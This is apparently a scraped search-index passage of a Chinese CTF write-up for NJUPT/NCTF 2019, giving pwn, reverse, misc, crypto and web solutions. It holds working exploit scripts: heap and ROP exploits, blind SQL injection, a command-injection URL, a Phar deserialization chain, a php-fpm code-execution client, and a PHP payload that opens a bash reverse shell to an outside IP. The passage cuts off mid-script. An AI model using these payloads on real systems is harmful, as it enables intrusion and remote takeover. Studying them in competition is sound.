p64(P.got['puts']+base) payload+= p64(P.plt['puts']+base) payload+= call_fun(P.got['read']+base,0x100,base+0x201500,0) payload+= p64(p_rbp) payload+= p64(base+0x201500) payload+= p64(leave) p.send(payload) libcbase = u64(p.recv(6).ljust(8,'\\x00')) - libc.sym['puts'] log.success('libcbase = '+hex(libcbase)) payload = p64(base+0x201500) payload+= p64(p_rdi) payload+= p64(libcbase+libc.search('/bin/sh\\x00').next()) payload+= p64(libcbase+libc.sym['system']) p.send(payload) #NCTF{rop_1s_b4st!!!!} if attach == 1: gdb.attach(p) p.interactive() easy_heap \u4e24\u6b21fb_atk #coding:utf-8 from pwn import * path = './easy_heap' local = 1 attach = 0 #P = ELF(path) context(os='linux',arch='amd64',terminal=['terminator','-x','sh','-c']) context.log_level = 'debug' if local == 0: p = process(path) if context.arch == 'amd64': libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') else: libc = ELF('/lib/i386-linux-gnu/libc.so.6') else: p = remote('139.129.76.65',50001) libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') def new(size,content): p.recvuntil('4. exit\\n') p.sendline('1') p.recvuntil('size?\\n') p.sendline(str(size)) p.recvuntil('ontent?\\n') p.send(content) def delete(index): p.recvuntil('4. exit\\n') p.sendline('2') p.recvuntil('index?\\n') p.sendline(str(index)) def show(index): p.recvuntil('4. exit\\n') p.sendline('3') p.recvuntil('index?\\n') p.sendline(str(index)) p.recvuntil('your name?\\n') p.send(p64(0)+p64(0x60)) new(0x50,'\\x00'*0x50) #0 new(0x50,'\\x11'*0x50) #1 delete(0) delete(1) delete(0) new(0x50,p64(0x602060)) new(0x50,'\\x33'*0x50) new(0x50,'\\x44'*0x50) payload = p64(0) + p64(0x1000) + p64(0)*8 new(0x50,payload) new(0x80,'\\x00') #0 new(0x60,'\\x11'*0x60) #1 delete(0) show(0) p.recvuntil('0: ') libcbase = u64(p.recv(6).ljust(8,'\\x00')) - (0x7f54cfedab78-0x00007f54cfb16000) log.success('libcbase = '+hex(libcbase)) new(0x60,'\\x22'*0x60) delete(1) delete(2) delete(1) new(0x60,p64(libcbase+libc.sym['__malloc_hook']-0x23)) new(0x60,'\\x00') new(0x60,'\\x00') one_gadget = [0x4526a,0x45216,0xf02a4,0xf1147] payload = '\\x00'*0x13 + p64(libcbase+one_gadget[2]) new(0x60,payload) delete(6) if attach == 1: gdb.attach(p) p.interactive() Re \u7b7e\u5230\u9898 IDA\u6253\u5f00 \u8fdb\u5230 sub_401340 \u4e2d \u5c31\u662f\u6709\u4e00\u4e2a7*7\u7684\u77e9\u9635\u548c\u6211\u4eec\u8f93\u5165\u768449\u4f4d\u5b57\u7b26\u7684ASCII\u7801\u6309\u5217\u6392\u5e03\u6784\u6210\u7684\u77e9\u9635(\u7b2c\u4e00\u5217\u662fa[0]~a[6])\u76f8\u4e58\u4f1a\u5f97\u5230dword_404000 \u9664\u4e86 dword_404000[0]=4884h \u5916\u90fd\u662f4\u884c\u4ee3\u8868\u4e00\u4e2a\u5143\u7d20,\u5373 dword_404000[1]=91C4h dword_404000[2]=7D35h dword_404000[3]=81FEh ... \u7136\u540e\u5c31\u662f\u6c42\u89e3\u975e\u9f50\u6b21\u7ebf\u6027\u65b9\u7a0b\u7ec4\u4e86 $$ \\left{ \\begin{matrix} 12 & 53 & 6 & 34 & 58 & 36 & 1 \\ 83 & 85 & 12 & 73 & 27 & 96 & 52 \\ 78 & 53 & 24 & 36 & 86 & 25 & 46 \\ 39 & 78 & 52 & 9 & 62 & 37 & 84 \\ 23 & 6 & 14 & 74 & 48 & 12 & 83 \\ 27 & 85 & 92 & 42 & 48 & 15 & 72 \\ 4 & 6 & 3 & 67 & 0 & 26 & 68 \\end{matrix} \\right} \\tag{1} $$ $$ \\left{ \\begin{matrix} a1[0] & a1[7] & a1[14] & a1[21] & a1[28] & a1[35] & a1[42] \\ a1[1] & a1[8] & a1[15] & a1[22] & a1[29] & a1[36] & a1[43] \\ a1[2] & a1[9] & a1[16] & a1[23] & a1[30] & a1[37] & a1[44] \\ a1[3] & a1[10] & a1[17] & a1[24] & a1[31] & a1[38] & a1[45] \\ a1[4] & a1[11] & a1[18] & a1[25] & a1[32] & a1[39] & a1[46] \\ a1[5] & a1[12] & a1[19] & a1[26] & a1[33] & a1[40] & a1[47] \\ a1[6] & a1[13] & a1[20] & a1[27] & a1[34] & a1[41] & a1[48] \\end{matrix} \\right} \\tag{2} $$ $$ \\left{ \\begin{matrix} d[0] & d[7] & d[14] & d[21] & d[28] & d[35] & d[42] \\ d[1] & d[8] & d[15] & d[22] & d[29] & d[36] & d[43] \\ d[2] & d[9] & d[16] & d[23] & d[30] & d[37] & d[44] \\ d[3] & d[10] & d[17] & d[24] & d[31] & d[38] & d[45] \\ d[4] & d[11] & d[18] & d[25] & d[32] & d[39] & d[46] \\ d[5] & d[12] & d[19] & d[26] & d[33] & d[40] & d[47] \\ d[6] & d[13] & d[20] & d[27] & d[34] & d[41] & d[48] \\end{matrix} \\right} \\tag{3} $$ (1) * (2) = (3) NCTF{nctf2019_linear_algebra_is_very_interesting} debug IDA\u6253\u5f00 \u6211\u6ca1\u622a\u56fe2333\uff0c\u4e0d\u8fc7\u53ef\u4ee5\u901a\u8fc7\u52a8\u8c03\u6765\u5f97\u5230\u7b54\u6848\uff0c\u597d\u50cf\u662f\u4e2d\u9014\u751f\u6210flag\u6765\u548c\u8f93\u5165\u7684\u5b57\u7b26\u4e32\u6bd4\u8f83 \u53ea\u9700\u8981\u518d\u6bd4\u8f83\u7684\u5730\u65b9\u4e0b\u65ad\u70b9\uff0c\u67e5\u770b\u6808\u5373\u53ef\u5f97\u5230\u7b54\u6848\u3002 Easy Ternary AHK\u811a\u672c\u8bed\u8a00\u5f88\u660e\u767d\u4e86\uff0c\u76f4\u63a5\u5230exe\u91cc\u628a\u811a\u672c\u63d0\u51fa\u6765 XOR(a, b) { tempA := a tempB := b ret := 0 Loop, 8 { ret += Mod((((tempA >> ((A_Index - 1)*4)) & 15) + ((tempB >> ((A_Index - 1)*4)) & 15)),3) * (16**(A_Index-1)) } return ret } InputBox, userInput, TTTTCL, Input your flag: if(ErrorLevel) Exit if(!StrLen(userInput)) #\u6ca1\u6709\u8bfb\u5165 { MsgBox, GG Exit } inputArr := [] #\u4fdd\u5b58\u8f93\u5165\u7684\u6570\u636e Loop, parse, userInput { temp:=A_Index inputArr.Push(Ord(A_LoopField)) #\u8bfb\u5165\u8bfb\u5165\u6846 } inputNum := [] #\u64cd\u4f5c\u540e\u4fdd\u5b58\u7684\u6570\u7ec4 Loop % inputArr.Length() { temp := inputArr[A_Index] temp := DllCall(\"aiQG.dll\\?ToTrit@@YAII@Z\", \"UInt\", temp) inputNum.push(temp) } key1 := XOR(inputNum[5], inputNum[inputNum.Length()]) #key\u5c31\u662f{}\u7684XOR inputFlag := [] Loop % inputArr.Length() { temp := XOR(inputNum[A_Index], key1) if(Mod(A_Index,2)) { temp := XOR(key1,temp) } inputFlag.push(temp) } temp1 := 1 #\u662f\u5426\u6210\u529f Loop % inputFlag.Length() #\u68c0\u9a8c { temp := inputFlag[A_Index] temp := DllCall(\"aiQG.dll\\?Check@@YAIII@Z\", \"UInt\", temp, \"UInt\", A_Index) if(!temp) { temp1 := 0 } } if(temp1) { MsgBox, Ok } if(!temp1) { MsgBox, GG } \u8c03\u7528\u4e86dll,\u9006\u5411dll\uff0c\u53d1\u73b0\u5c31\u4e00\u4e2a\u5bf9\u6bd4\u6570\u5b57\u548c\u8f6c\u4e09\u8fdb\u5236 exp\uff1a #include<cstdio> #include<cmath> #include<windows.h> using namespace std; int xors(int a,int b) { int ret=0; for(int i=1;i<=8;i++) ret=ret+(((a>>(((i-1)*4))&15)+((b>>((i-1)*4))&15))%3)*(pow(16,(i-1))); return ret; } int change(int x) { int t,ans=0,k=0; while(x) { t=x%10; ans=ans+pow(3,k++)*t; x/=10; } return ans; } void genS() { int data[100]={0x00,0x10011,0x21020,0x21101,0x21000,0x22211,0x2220,0x21200,0x2101,0x22120,0x20122,0x22220,0x2021,0x10122,0x20102,0x22111,0x211,0x12012,0x2210,0x22202,0x2021,0x21101,0x2222,0x21101,0x2222,0x21121,0x21120,0x22210}; for(int c=1;c<=27;c++) { for(int i=0;i<=0x22222222;i++) { int t=xors(i,0x22212); if(c%2) t=xors(0x22212,t); if(t==data[c]) { printf(\"%X,\",i); break; } } } } int main() { int s[1000]={2220,2111,10010,2121,11120,10011,10112,10222,11002,1210,11102,10112,2001,1220,11020,11002,1221,10001,11111,10112,10010,10010,10010,10010,10000,2211,11122,0}; for(int i=0;s[i]!=0;i++) printf(\"%c\",change(s[i])); return 0; } \u4e11\u964b\u7684\u4ee3\u7801 \u786e\u5b9e\u591f\u4e11\u964b\u7684\uff0c\u5230\u5904\u8df3\u8f6c IDA\u6253\u5f00\u540e\u53d1\u73b0\u6709\u53cd\u8c03\u8bd5\uff0cnop\u6389\uff0c\u53d1\u73b0\u539f\u6765\u65e0\u6cd5\u8fd0\u884c\u7684\u51fd\u6570\u53ef\u4ee5\u8fd0\u884c\u4e86(\u4e4b\u524d\u5f02\u6216\u4e86) \u9274\u4e8e\u65e0\u6cd5F5\uff0c\u5f00\u59cb\u5934\u94c1\u65f6\u95f4\uff0c\u53d1\u73b0\u6700\u540e\u5c31\u662f\u4e2aTEA #include<cstdio> #define _DWORD int using namespace std; unsigned char code[]={0x88,0x71,0x3E,0xFE,0x66,0xF6,0x77,0xD7,0xA0,0x51,0x29,0xF9,0x11,0x79,0x71,0x49,0xF1,0x61,0xA0,0x9,0xF1,0x29,0x1,0xB1}; /* tea_decrypt(0x61869F5E,0x0A9CF08D); tea_decrypt(0xAD74C0CA,0xA57F16B8); tea_decrypt(0xB559626D,0xD17B68E0);*/ int getlowbit(int x) { return x&0xFF; } void tea_decrypt(unsigned long v0,unsigned long v1) { unsigned long sum=0xC6EF3720,i; unsigned long delta=0x9e3779b9; unsigned long k0=0x12345678,k1=0xBADF00D,k2=0x05201314,k3=0x87654321; for(i=0;i<32;i++) { v1-=((v0<<4)+k2)^(v0+sum)^((v0>>5)+k3); v0-=((v1<<4)+k0)^(v1+sum)^((v1>>5)+k1); sum-=delta; } unsigned char* v=((unsigned char*)&v0); printf(\"0x%X 0x%X 0x%X 0x%X\\n\",getlowbit(*((char*)v)),getlowbit(*((char*)v+1)),getlowbit(*((char*)v+2)),getlowbit(*((char*)v+3))); v=((unsigned char*)&v1); printf(\"0x%X 0x%X 0x%X 0x%X\\n\",getlowbit(*((char*)v)),getlowbit(*((char*)v+1)),getlowbit(*((char*)v+2)),getlowbit(*((char*)v+3))); } unsigned char encode(unsigned char c) { int a=c>>5,b=c<<3; return ((a|b)^0x5A); } int main() { for(int i=0;i<24;i++) { int c=code[i]; for(int j=0;j<=0xFF;j++) if(c==encode(j)) { int t=j; if(i==0 || i==4) t-=0xC; if(i==1 || i==5) t-=0x22; if(i==2 || i==6) t-=0x38; if(i==3 || i==7) t-=0x4E; printf(\"%c\",t); } } return 0; } F-Bird \u5f00\u5386\u53f2\u7684\u5012\u8f66\uff0c16\u4f4d\u90fd\u6765\u4e86 \u76f4\u63a5\u770b\u6c47\u7f16\uff0c\u6709\u4e00\u6bb5\u5f02\u6216\uff0c\u4e0d\u8fc7\u7528bx\u5bc4\u5b58\u5668\u9ad8\u4f4e\u4f4d\u4f9d\u6b21\u5f02\u6216 \u7b97\u51fa\u6765\u4e24\u4e2a\u5f02\u6216\u7684\u6570\u662f\u591a\u5c11 \u7136\u540e\u5f02\u6216\u5c31\u884c\u4e86 k=[0x8E,0x9D,0x94,0x98,0xBB,0x89,0xF3,0xEF,0x83,0xEE,0xAD,0x9B,0x9F,0x9A,0xF0,0xEB,0x9F,0x97,0xF6,0xBC,0xF1,0xE9,0x9F,0xE7,0xA1,0xB3,0xF3,0xA3] i=0 flag=\"\" for c in k: if(i&1): flag=flag+chr(c^0xde) else: flag=flag+chr(c^0xc0) i=i+1 print(flag) Misc NCTF2019\u95ee\u5377\u8c03\u67e5 \u586b\u8868\uff0c\u586b\u5b8c\u5c31\u51faflag PiP2 install \u5148\u5229\u7528\u865a\u62df\u673a\u8fde\u63a5\u4e00\u4e0b\u3002[\u56fe\u7247] \u6211\u5df2\u7ecf\u4e0b\u8fc7\u4e86 \u4e0b\u8f7d\u7684\u8fc7\u7a0b\u4e2d\u6709\u4e00\u4e2a\u94fe\u63a5\u51fa\u6765\u4e86\u3002 win\u4e0b\u6253\u5f00\u5b83\uff01 \u5b58\u5728\u4e00\u4e2asetup.py \u4e2d\u95f4\u6709\u4e00\u4e32\u4e0d\u77e5\u6240\u4e91\u7684\u5b57\u7b26\u4e32\u3002 \u76f4\u63a5base64\u89e3\u5bc6\u5c31\u53ef\u4ee5\u4e86 a_good_idea \u4e00\u5f20\u56fe\u7247\u3002\u60f3\u90fd\u4e0d\u8981\u60f3\u76f4\u63a5binwalk [\u56fe\u7247] \u6709\u4e24\u5f20\u56fe\u7247\uff0chint\u662f\u5bfb\u627e\u50cf\u7d20\u7684\u79d8\u5bc6\u3002 \u90a3\u5c31stegsolve\u4e00\u4e0bcombine\u4e24\u5f20\u56fe\u7247\u7136\u540e\u5de6\u53f3\u5207\u6362\u901a\u9053\u4e00\u6b21\u5c31\u5f97\u5230\u4e8c\u7ef4\u7801\u4e86 \u626b\u63cf\u5373\u53ef what`s this \u6d41\u91cf\u5206\u6790\u76f4\u63a5\u770bhttp\u534f\u8bae\u3002\u5168\u90e8\u5bfc\u51fa\u540e\u5f97\u5230\u6709\u4e00\u4e2azip\u6587\u4ef6\u5305\u91cc\u9762\u5305\u542b\u4e86\u4e00\u4e2awhat 1s th1s .txt\u91cc\u9762\u683c\u5f0f\u4e0ebase64\u9690\u5199\u5f88\u50cf\u76f4\u63a5py\u8fd0\u884c [\u56fe\u7247] Become a Rockstar \u4e0b\u8f7d\u5f97\u5230\u4e00\u4e2arock\u6587\u4ef6 \u4e00\u756a~~\u767e\u5ea6~~Bing\u540e\u4e86\u89e3\u5230Rockstar\u8fd9\u4e2a\u7f16\u7a0b\u8bed\u8a00 https://github.com/RockstarLang/rockstar https://github.com/yyyyyyyyyyan/rockstar-py \u4f7f\u7528rockstar-py rockstar-py Become_a_Rockstar.rock \u5f97\u5230\u4e00\u6bb5python\u4ee3\u7801 Leonard_Adleman = \"star\" Problem_Makers = 76 Problem_Makers = \"NCTF{\" def God(World): a_boy = \"flag\" the_boy = 3 def Evil(your_mind): a_girl = \"no flag\" the_girl = 5 Truths = 3694 Bob = \"ar\" Adi_Shamir = \"rock\" def Love(Alice, Bob): Mallory = 13 Mallory = 24 Everything = 114514 Alice = \"you\" def Reality(God, Evil): God = 26 Evil = 235 Ron_Rivest = \"nice\" def You_Want_To(Alice, Love, Anything): You = 5.75428 your_heart = input() You = 5 your_mind = input() Nothing = 31 if Truths * Nothing == Everything: RSA = Ron_Rivest + Adi_Shamir + Leonard_Adleman if Everything / Nothing == Truths: Problem_Makers = Problem_Makers + Alice + Bob print(Problem_Makers) the_flag = 245 the_confusion = 244 print(RSA) Mysterious_One = \"}\" print(Mysterious_One) This = 4 This = 35 This = 7 This = 3 This = 3 This = 37 \u8dd1\u4e00\u4e0bflag\u5c31\u51fa\u6765\u4e86 NCTF{youarnicerockstar} \u5c0f\u72d7\u7684\u79d8\u5bc6 \u53c8\u4e00\u4e2a\u6d41\u91cf\u5206\u6790\u76f4\u63a5\u5bfchttp\u53d1\u73b0\u5305\u91cc\u5b58\u5728\u4e00\u4e2a1.html\u6253\u5f00\u90fd\u662f \u76f4\u63a5\u8f6ctxt\u731c\u6d4b\u662f\u56fe\u7247RGB \u5229\u7528python\u811a\u672c\u8f6c\u6210\u56fe\u7247\u53ef\u6700\u7ec8\u5f97\u5230flag. 2077 \u76f4\u63a5 Google Cyberpunk 2077 stream decode. \u7136\u540e\u5728\u4e00\u4e2a reddit \u5e16\u5b50 \u4e2d\uff0c\u627e\u5230\u56fe\u7247\u4e0b\u8f7d\u5730\u5740\u3002\u4e0b\u8f7d\u540e\u7528 sha256sum \u6c42 sha256 \u503c\u5373\u53ef\u3002 Crypto keyboard \u770b\u5230\u8fd9\u91cc\u603b\u5171\u67098\u4e2a\u5b57\u6bcd\uff0c\u6700\u591a\u91cd\u590d\u4e864\u6b21\uff0c\u89c9\u5f97\u5c31\u5bf9\u5e94\u4e86\u624b\u673a\u952e\u76d8\u4e2d\u7684\u4e5d\u5bab\u8f93\u5165\u6cd5\uff0c\u53bb\u624b\u8bd5\u4e86\u8bd5\uff0c\u524d\u9762\u5c31\u51fa\u6765\u4e86youare\uff0c\u4e8e\u662f\u5199\u4e86\u4e2a\u7a0b\u5e8f\u7801\u4e86\u51fa\u6765 #include <cstdio> #include <cstring> char a[100][5]={\"ooo\",\"yyy\",\"ii\",\"w\",\"uuu\",\"ee\",\"uuuu\",\"yyy\",\"uuuu\",\"y\",\"w\",\"uuu\",\"i\",\"i\",\"rr\",\"w\",\"i\",\"i\",\"rr\",\"rrr\",\"uuuu\",\"rrr\",\"uuuu\",\"t\",\"ii\",\"uuuu\",\"i\",\"w\",\"u\",\"rrr\",\"ee\",\"www\",\"ee\",\"yyy\",\"eee\",\"www\",\"w\",\"tt\",\"ee\"}; char b[100][5]={\"w\",\"ww\",\"www\",\"e\",\"ee\",\"eee\",\"r\",\"rr\",\"rrr\",\"t\",\"tt\",\"ttt\",\"y\",\"yy\",\"yyy\",\"u\",\"uu\",\"uuu\",\"uuuu\",\"i\",\"ii\",\"iii\",\"o\",\"oo\",\"ooo\",\"oooo\"}; char c[27]=\"abcdefghijklmnopqrstuvwxyz\"; int main() { for(int i=0;i<=38;++i) { for(int j=0;j<=25;++j) { if(strcmp(a[i],b[j])==0) { printf(\"%c\",c[j]); break; } } } return 0; } youaresosmartthatthisisjustapieceofcake","title":"NJUPT CTF \u5929\u7487Writeup"},{"location":"writeup/NJUPT-2019/#njupt-ctf-writeup","text":"","title":"NJUPT CTF \u5929\u7487Writeup"},{"location":"writeup/NJUPT-2019/#web","text":"","title":"Web"},{"location":"writeup/NJUPT-2019/#hacker_backdoor","text":"\u8fd9\u91cc\u662fdisable_function\u5fd8\u8bb0\u6dfb\u52a0proc_open\uff0c\u7528curl\u5e26\u51fa\u6765\u5c31\u597d import requests url = \"http://nctf2019.x1ct34m.com:60004/?useful=/etc/passwd&code=$a=%22create_f%22.%22unction%22;$c=$a(%27%27,$_POST[a]);$c();\" print requests.post(url,data={'a':\"\"\" $descriptorspec=array( 0=>array('pipe','r'), //STDIN 1=>array('pipe','w'),//STDOUT 2=>array('pipe','w') //STDERROR ); $handle=proc_open('bash -c \"bash -i >& /dev/tcp/122.152.230.160/2333 0>&1\"',$descriptorspec,$pipes,NULL); var_dump($handle); \"\"\"}).text","title":"hacker_backdoor"},{"location":"writeup/NJUPT-2019/#simple-xss","text":"\u968f\u4fbf\u6ce8\u518c\u540e\u53d1\u73b0\u76f4\u63a5\u53ef\u4ee5XSS\uff0c\u4f46\u662f\u6ca1\u6709\u4efb\u4f55\u65b9\u5411\uff0c\u8fd9\u4e2a\u65f6\u5019admin\u8d26\u6237\u88ab\u6ce8\u518c\u8fc7\u4e86\uff0c\u60f3\u6cd5\u662f\u76f4\u63a5\u7528admin\u7684cookie\u767b\u5165\uff0c\u642d\u5efa\u597d\u5e73\u53f0\u540e\uff0c\u5411admin\u53d1\u9001XSS payload\uff0c\u77ac\u95f4\u770b\u5230\u4e86admin\u7684cookie. burp\u5c06\u5176\u81ea\u5df1\u7528\u6237\u7684COOKIE\u66ff\u6362\u6210\u4e3aadmin\u7684cookie\uff0c\u5f97\u5230flag\uff1aNCTF{Th1s_is_a_Simple_xss}","title":"simple XSS"},{"location":"writeup/NJUPT-2019/#flask_website","text":"\u4efb\u610f\u6587\u4ef6\u8bfb+PIN-Debug\uff0cdocker\u6a21\u5f0f\u4e0bmachine\u2014id\u6709\u53d8\u5316\u3002\u66f4\u65b0\u811a\u672c\u5373\u53ef \u53c2\u8003\u6587\u732e\uff1a Flask debug pin\u5b89\u5168\u95ee\u9898 #!/usr/bin/python2.7 #coding:utf-8 from sys import * import requests import re from itertools import chain import hashlib def genpin(mac,mid): probably_public_bits = [ 'ctf',# username 'flask.app',# modname 'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__')) '/usr/local/lib/python3.6/site-packages/flask/app.py' # getattr(mod, '__file__', None), ] mac = \"0x\"+mac.replace(\":\",\"\") mac = int(mac,16) private_bits = [ str(mac),# str(uuid.getnode()), /sys/class/net/eth0/address str(mid)# get_machine_id(), /proc/sys/kernel/random/boot_id ] h = hashlib.md5() for bit in chain(probably_public_bits, private_bits): if not bit: continue if isinstance(bit, str): bit = bit.encode('utf-8') h.update(bit) h.update(b'cookiesalt') num = None if num is None: h.update(b'pinsalt') num = ('%09d' % int(h.hexdigest(), 16))[:9] rv =None if rv is None: for group_size in 5, 4, 3: if len(num) % group_size == 0: rv = '-'.join(num[x:x + group_size].rjust(group_size, '0') for x in range(0, len(num), group_size)) break else: rv = num return rv # 02:42:ac:16:00:02 /sys/class/net/eth0/address # 21e83dfd-206c-4e80-86be-e8d0afc467a1 /proc/sys/kernel/random/boot_id def getcode(content): try: return re.findall(r\"<pre>([\\s\\S]*)</pre>\",content)[0].split()[0] except: return '' def getshell(): print genpin(\"02:42:ac:16:00:02\",\"8657e88ac278e9225ba324bb8033ca3398c16c7b517417b55c1f164e90d97a46\") if __name__ == '__main__': print(getshell())","title":"flask_website"},{"location":"writeup/NJUPT-2019/#sqli","text":"\u539f\u9898,\u4f7f\u7528REGEXP\u6b63\u5219 import requests url = \"http://nctf2019.x1ct34m.com:40005/index.php\" flag = \"\" k = 0 list = \"qwertyuiopasdfghjklzxcvbnm_0123456789\" while True: k+= 1 print k, for i in list: p = len(requests.post(url,data={ \"passwd\":\"\"\"||passwd/**/REGEXP/**/\"^\\\\{}\";\\x00\"\"\".format(flag+i), \"username\":'\\\\' }).text) if p == 48: # print chr(i) flag += i print flag break","title":"SQLi"},{"location":"writeup/NJUPT-2019/#easyphp","text":"\u5957\u5a03\u9898\uff0c\u6ca1\u5565\u8bf4\u7684 http://nctf2019.x1ct34m.com:60005/?num=23333%0a&str1=2120624&str2=240610708&q%20w%20q=c\\at%20*","title":"easyphp"},{"location":"writeup/NJUPT-2019/#phar-matches-everything","text":"\u6839\u636evim\u4ea4\u6362\u6587\u4ef6\u5f97\u5230\u6587\u4ef6\u6e90\u7801 \u7b2c\u4e8c\u6b65\u6839\u636e Phar \u6784\u9020\u53cd\u5e8f\u5217\u5316 \u4f7f\u7528curl\u5f97\u5230SSTI \u6700\u540e\u5185\u7f51\u626b\u63cf\u5f97\u5230\u4e00\u4e2ahint => fpm \u7136\u540e\u901a\u8fc7gopher\u534f\u8bae\u5f97\u5230 Phar+SSTI+FPM <?php class Easytest{ protected $test; public function __construct(){ $this->test = '1'; } public function funny_get(){ return $this->test; } } class Main { public $url; public function curl($url){ $ch = curl_init(); curl_setopt($ch,CURLOPT_URL,$url); curl_setopt($ch,CURLOPT_RETURNTRANSFER,true); $output=curl_exec($ch); curl_close($ch); return $output; } public function __destruct(){ $this_is_a_easy_test=unserialize($_GET['careful']); if($this_is_a_easy_test->funny_get() === '1'){ echo $this->curl($this->url); } } } $a = new Easytest(); echo urlencode(serialize($a)); //O%3A8%3A%22Easytest%22%3A1%3A%7Bs%3A7%3A%22%00%2A%00test%22%3Bs%3A1%3A%221%22%3B%7D $m = new Main(); $url = $argv[1]; $m->url = \"\"; #!coding=utf8 import requests import re file = open('phar.phar') url1 = \"http://nctf2019.x1ct34m.com:40004/upload.php\" url2 = \"http://nctf2019.x1ct34m.com:40004/catchmime.php?careful=O%3A8%3A%22Easytest%22%3A1%3A%7Bs%3A7%3A%22%00%2A%00test%22%3Bs%3A1%3A%221%22%3B%7D\" def upload(): content = requests.post(url1,files={\"fileToUpload\":('1.gif',file)}).text print content return re.findall(r\"file (.*) has\",content)[0].strip() def req(filename): print requests.post(url2,data={ 'name':'phar:///var/www/html/uploads/{}/test.txt'.format(filename), 'submit':1 }).text name = upload() print name req(name) import socket import random import argparse import sys from io import BytesIO # Referrer: https://github.com/wuyunfeng/Python-FastCGI-Client PY2 = True if sys.version_info.major == 2 else False def bchr(i): if PY2: return force_bytes(chr(i)) else: return bytes([i]) def bord(c): if isinstance(c, int): return c else: return ord(c) def force_bytes(s): if isinstance(s, bytes): return s else: return s.encode('utf-8', 'strict') def force_text(s): if issubclass(type(s), str): return s if isinstance(s, bytes): s = str(s, 'utf-8', 'strict') else: s = str(s) return s class FastCGIClient: \"\"\"A Fast-CGI Client for Python\"\"\" # private __FCGI_VERSION = 1 __FCGI_ROLE_RESPONDER = 1 __FCGI_ROLE_AUTHORIZER = 2 __FCGI_ROLE_FILTER = 3 __FCGI_TYPE_BEGIN = 1 __FCGI_TYPE_ABORT = 2 __FCGI_TYPE_END = 3 __FCGI_TYPE_PARAMS = 4 __FCGI_TYPE_STDIN = 5 __FCGI_TYPE_STDOUT = 6 __FCGI_TYPE_STDERR = 7 __FCGI_TYPE_DATA = 8 __FCGI_TYPE_GETVALUES = 9 __FCGI_TYPE_GETVALUES_RESULT = 10 __FCGI_TYPE_UNKOWNTYPE = 11 __FCGI_HEADER_SIZE = 8 # request state FCGI_STATE_SEND = 1 FCGI_STATE_ERROR = 2 FCGI_STATE_SUCCESS = 3 def __init__(self, host, port, timeout, keepalive): self.host = host self.port = port self.timeout = timeout if keepalive: self.keepalive = 1 else: self.keepalive = 0 self.sock = None self.requests = dict() def __connect(self): self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) self.sock.settimeout(self.timeout) self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) # if self.keepalive: # self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 1) # else: # self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 0) try: self.sock.connect((self.host, int(self.port))) except socket.error as msg: self.sock.close() self.sock = None print(repr(msg)) return False return True def __encodeFastCGIRecord(self, fcgi_type, content, requestid): length = len(content) buf = bchr(FastCGIClient.__FCGI_VERSION) \\ + bchr(fcgi_type) \\ + bchr((requestid >> 8) & 0xFF) \\ + bchr(requestid & 0xFF) \\ + bchr((length >> 8) & 0xFF) \\ + bchr(length & 0xFF) \\ + bchr(0) \\ + bchr(0) \\ + content return buf def __encodeNameValueParams(self, name, value): nLen = len(name) vLen = len(value) record = b'' if nLen < 128: record += bchr(nLen) else: record += bchr((nLen >> 24) | 0x80) \\ + bchr((nLen >> 16) & 0xFF) \\ + bchr((nLen >> 8) & 0xFF) \\ + bchr(nLen & 0xFF) if vLen < 128: record += bchr(vLen) else: record += bchr((vLen >> 24) | 0x80) \\ + bchr((vLen >> 16) & 0xFF) \\ + bchr((vLen >> 8) & 0xFF) \\ + bchr(vLen & 0xFF) return record + name + value def __decodeFastCGIHeader(self, stream): header = dict() header['version'] = bord(stream[0]) header['type'] = bord(stream[1]) header['requestId'] = (bord(stream[2]) << 8) + bord(stream[3]) header['contentLength'] = (bord(stream[4]) << 8) + bord(stream[5]) header['paddingLength'] = bord(stream[6]) header['reserved'] = bord(stream[7]) return header def __decodeFastCGIRecord(self, buffer): header = buffer.read(int(self.__FCGI_HEADER_SIZE)) if not header: return False else: record = self.__decodeFastCGIHeader(header) record['content'] = b'' if 'contentLength' in record.keys(): contentLength = int(record['contentLength']) record['content'] += buffer.read(contentLength) if 'paddingLength' in record.keys(): skiped = buffer.read(int(record['paddingLength'])) return record def request(self, nameValuePairs={}, post=''): if not self.__connect(): print('connect failure! please check your fasctcgi-server !!') return requestId = random.randint(1, (1 << 16) - 1) self.requests[requestId] = dict() request = b\"\" beginFCGIRecordContent = bchr(0) \\ + bchr(FastCGIClient.__FCGI_ROLE_RESPONDER) \\ + bchr(self.keepalive) \\ + bchr(0) * 5 request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_BEGIN, beginFCGIRecordContent, requestId) paramsRecord = b'' if nameValuePairs: for (name, value) in nameValuePairs.items(): name = force_bytes(name) value = force_bytes(value) paramsRecord += self.__encodeNameValueParams(name, value) if paramsRecord: request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, paramsRecord, requestId) request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, b'', requestId) if post: request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, force_bytes(post), requestId) request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, b'', requestId) self.sock.send(request) self.requests[requestId]['state'] = FastCGIClient.FCGI_STATE_SEND self.requests[requestId]['response'] = b'' return self.__waitForResponse(requestId) def __waitForResponse(self, requestId): data = b'' while True: buf = self.sock.recv(512) if not len(buf): break data += buf data = BytesIO(data) while True: response = self.__decodeFastCGIRecord(data) if not response: break if response['type'] == FastCGIClient.__FCGI_TYPE_STDOUT \\ or response['type'] == FastCGIClient.__FCGI_TYPE_STDERR: if response['type'] == FastCGIClient.__FCGI_TYPE_STDERR: self.requests['state'] = FastCGIClient.FCGI_STATE_ERROR if requestId == int(response['requestId']): self.requests[requestId]['response'] += response['content'] if response['type'] == FastCGIClient.FCGI_STATE_SUCCESS: self.requests[requestId] return self.requests[requestId]['response'] def __repr__(self): return \"fastcgi connect host:{} port:{}\".format(self.host, self.port) if __name__ == '__main__': parser = argparse.ArgumentParser(description='Php-fpm code execution vulnerability client.') parser.add_argument('host', help='Target host, such as 127.0.0.1') parser.add_argument('file', help='A php file absolute path, such as /usr/local/lib/php/System.php') parser.add_argument('-c', '--code', help='What php code your want to execute', default='<?php phpinfo(); exit; 